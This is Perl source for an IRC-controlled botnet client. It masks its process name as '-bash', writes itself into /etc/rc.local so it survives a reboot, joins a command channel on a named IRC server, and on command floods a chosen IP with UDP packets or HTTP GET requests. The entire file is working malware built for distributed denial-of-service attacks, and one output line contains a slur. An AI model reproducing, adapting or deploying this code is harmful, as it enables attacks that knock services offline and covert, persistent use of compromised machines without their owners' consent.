use strict;
use Socket;
use IO::Socket;
addtostartup();

#Commands
#!udp <ip> <port> <time> <packetsize> //UDP Flooder
#!httpget <host> <page> <time> //HTTP-GET Flooder
#!quit //Quits bot
#Made by Vypor | Github.com/Vypor
#Hidden Proccess
$0 = "-bash";

#Server IP or hostname, Channel, Serverpassword (nothing if you dont have one)
my $server      = "vypor.net";
my $channel     = "#bot";
my $serverport  = "6667";
my $maxnamechar = "6";
my $serverpass  = "";

reconnect:
my $nick;
for ( 0 .. $maxnamechar ) { $nick .= chr( int( rand(25) + 65 ) ); }
my $login;
for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }

my $sock = new IO::Socket::INET(
    PeerAddr => $server,
    PeerPort => $serverport,
    Proto    => 'tcp'
) or goto reconnect and print "fag\n";

if ( $serverpass = !'' ) {
    print $sock "PASS $serverpass\r\n";
}

#Auth Ourselfs
print $sock "NICK $nick\r\n";
while ( my $input = <$sock> ) {
    
	#Reconnect And Change Nick Name

    if ( $input =~ /433/ ) {
        goto reconnect;
    }
    elsif ( $input =~ /^PING(.*)$/i ) {
        print $sock "PONG $1\r\n";
        print "Connected..!\n";
        print $sock "USER $login 8 * :Kawaii Bot\r\n";
        if ( $input =~ /^PING(.*)$/i ) {
            print $sock "PONG $1\r\n";
            print $sock "JOIN $channel\r\n";
        }

        last;
    }
}
my $user;
my $host;
my $chnl;
my $message;

while (<$sock>) {
    if ( $_ =~ /^PING(.*)$/i ) {
        print $sock "PONG $1\r\n";
    }
    if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {

	$user    = $1;
	$host    = $2;
	$chnl    = $3;
	$message = $4;



my ( $method, $ip, $port, $time, $packetsize, $other ) = split( / /, $message, 6 );


#IRC Command Parsing / Sub calling



        if ( $method =~ /^!quit\s*$/ ) {
             die "Quitting!\n";
	}
	
        if ( $method =~ /^!udp\s*$/ ) {
              my ( $iaddr, $endtime, $psize, $pport );
        	    $iaddr = inet_aton("$ip") or print "Cant find host..\n";
           	    $endtime = time() + ( $time ? $time : 1000000 );
            	    socket( flood, PF_INET, SOCK_DGRAM, 17 );
            
		print $sock "PRIVMSG $chnl :Throwing Kittens at: $ip for $time seconds\r\n";

            for ( ; time() <= $endtime ; ) {
                $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
                $pport = $port ? $port : int( rand(65500) ) + 1;
                send( flood, pack( "a$psize", "flood" ), 0, pack_sockaddr_in( $pport, $iaddr )
                );
            }
            print $sock "PRIVMSG $chnl :Ran out of kittens...\r\n";
	}
	
	
        if ( $method =~ /^!hi\s*$/ ) {
	print $sock "PRIVMSG $chnl :$method $ip $port $packetsize $other";
	}
	
	
        if ( $method =~ /^!httpget\s*$/ ) {
		print $sock "PRIVMSG $chnl :Starting HTTP-GEEEET Flood.\r\n";
            my $endtime;
            $endtime = time() + ( $time ? $time : 1000000 );
            for ( ; time() <= $endtime ; ) {
                my $httpget = IO::Socket::INET->new(
                    Proto    => 'tcp',
                    PeerAddr => $ip,
                    PeerPort => '80',
                ) or return $!;
                print $httpget "GET /" . $port . " HTTP/1.0\r\n";
                print $httpget "Host: ", $ip, "\r\n";
                print $httpget "Connection: close", "\r\n";
                print $httpget "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                print $httpget "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
            }
            print $sock "PRIVMSG $chnl :Finished HTTP-GEEEET Flood.\r\n";
        }


    }
}
sleep 15;
goto reconnect;



#System Checks
sub addtostartup {
    my @checkstr;
    my $location = sprintf( $ENV{'PWD'} );
    my $name     = "perl $location/$0";
    open( IN, '/etc/rc.local' ) or print "Couldnt add to startup\n";
    while ( my $line = <IN> ) { push( @checkstr, $line ); }
    my $checkme = join "", @checkstr;

    if ( $checkme =~ /$name/ ) { }
    else {
        print "Adding to Startup...\n";
        system("sed -i -e '1i$name\' /etc/rc.local");
    }
}
